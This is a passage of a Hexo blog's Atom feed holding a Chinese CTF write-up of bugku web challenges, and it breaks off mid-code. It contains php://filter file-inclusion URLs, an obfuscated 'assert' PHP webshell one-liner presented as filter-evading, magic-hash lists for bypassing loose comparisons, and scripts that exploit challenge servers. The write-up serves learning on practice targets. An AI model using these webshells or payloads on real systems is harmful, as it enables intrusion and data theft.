<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-02-07T07:15:56.510Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>百浪多息</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vim 使用之道 </title>
    <link href="https://prontosil.club/2019/02/07/vim-%E4%BD%BF%E7%94%A8%E4%B9%8B%E9%81%93/"/>
    <id>https://prontosil.club/2019/02/07/vim-使用之道/</id>
    <published>2019-02-07T07:15:56.000Z</published>
    <updated>2019-02-07T07:15:56.510Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用Linux架设服务器</title>
    <link href="https://prontosil.club/2019/02/07/%E4%BD%BF%E7%94%A8Linux%E6%9E%B6%E8%AE%BE%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://prontosil.club/2019/02/07/使用Linux架设服务器/</id>
    <published>2019-02-07T07:15:34.000Z</published>
    <updated>2019-02-07T07:15:34.656Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>bugku web题目的wp</title>
    <link href="https://prontosil.club/2019/02/07/bugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp/"/>
    <id>https://prontosil.club/2019/02/07/bugku-web题目的wp/</id>
    <published>2019-02-07T07:15:09.000Z</published>
    <updated>2019-02-15T06:09:15.599Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一直想把自己做过的bugkuctf题目汇个总， 现在终于腾出时间来啦！</p></blockquote><a id="more"></a><h1 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h1><p><img src="https://upload-images.jianshu.io/upload_images/10651191-a966a46b4a760043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="源代码"></p><p><code>ctrl + U</code>查看页面源代码，  如果有 <code>$user</code>且 <code>file_get_contents($user, &#39;r&#39;)</code> 的 值是 指定的字符串。 就会 <code>include</code> <code>$file</code> 的内容 。 并且提示是 <code>hint.php</code>这个文件</p><p>这里涉及到一个怎么把 <code>get</code> 方法传入的参数作为一个文件打开。</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>这里用到了 <code>php://input</code></p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-abf093d0b999015b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="伪协议"></p><p>但是。。<br><img src="https://upload-images.jianshu.io/upload_images/10651191-865fc538e247d441.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>这就要用到第二个伪协议：<br><code>php://filter</code></p><p>我那样传递参数会报错，  <code>include($file)</code> 只是把 <code>$file</code> 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。</p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-eabd5e3d3fd91095.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="php://filter协议"></p><p>这就是一个泄露了源码的漏洞了。</p><p>最后构造的URL如下：<br><code>http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code></p><p>惊叹。<br>base64 解密之后的源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>   <p>代码里面构造了一个类。<br>公有变量是 <code>$file</code> </p><p>继续看一下 <code>index.php</code> 的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸è½ç°å¨å°±ç»ä½ flagå¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;   </span><br></pre></td></tr></table></figure><p>有几个地方暂时写不到位， 先到这里好了。</p><h1 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h1><p>很蒙</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">php $poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc); $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>])</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是题目提示的过狗一句话代码。<br>然后…后面的不会了<br><img src="https://upload-images.jianshu.io/upload_images/10651191-5e14bf83c6761c80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/10651191-180727cac3e6accb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p><h1 id="字符，正则？"><a href="#字符，正则？" class="headerlink" title="字符，正则？"></a>字符，正则？</h1><p><img src="https://upload-images.jianshu.io/upload_images/10651191-e0f923bc5975d7f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p><h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><p>一道很有趣的题目， 就不说题目了， 直接放我的测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$v1&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($v1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> md5($v1).<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$v2&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> md5($v2).<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"true"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/10651191-4d5ff01e48d389a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试结果"></p><p>也是第一次发现get还能传递数组（不过当然是一堆的错误）</p><h1 id="MD5-collision"><a href="#MD5-collision" class="headerlink" title="MD5 collision"></a>MD5 collision</h1><p>还不太清楚MD5 碰撞是啥， 以后补坑</p><p><code>payload</code><br><code>120.24.86.145:9009/md5.php?a=s878926199a</code></p><p>常用的MD5碰撞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure></p><h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>下面的表达式的值是秋名山的车速<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>亲请在2s内计算老司机的车速是多少<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">div,p&#123;</span></span><br><span class="line"><span class="undefined">text-align: center;</span></span><br><span class="line"><span class="undefined">margin: 0 auto;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两秒之内计算出式子中的值， 再提交</p><p>菜鸡还不太会写脚本<br>参考了dalao们的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;<span class="string">'value'</span>: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure><p>不过还是没搞出来。</p><hr><p>复习一下<code>requests</code>库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#构造requests对象</span></span><br><span class="line"></span><br><span class="line">s = requests.get(url)</span><br><span class="line">s.post(url,   )</span><br><span class="line"></span><br><span class="line"><span class="comment">#差不多就这些了</span></span><br></pre></td></tr></table></figure><h1 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h1><p><img src="https://upload-images.jianshu.io/upload_images/10651191-ef56d1734bae0225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="题目"></p><p>然而注意到URL中的line和file时就能做出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用脚本把代码跑出来</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a):</span><br><span class="line">    url=<span class="string">"http://120.24.86.145:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span> </span><br><span class="line">    s=requests.get(url)</span><br><span class="line">    <span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;       <span class="comment">//看这里</span></span><br><span class="line"> $file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造cookie就行啦<br>（然而没搞出flag来）</p><h1 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h1><p>CBC字节翻转攻击<br>放一张经典的图<br><img src="https://upload-images.jianshu.io/upload_images/5035860-05d52e6d3d0061b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="CBC"></p><p>据师傅们的wp说是有一个index.php.swp文件存在。<br>然而没找到， 先把师傅们找到的源码放上来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        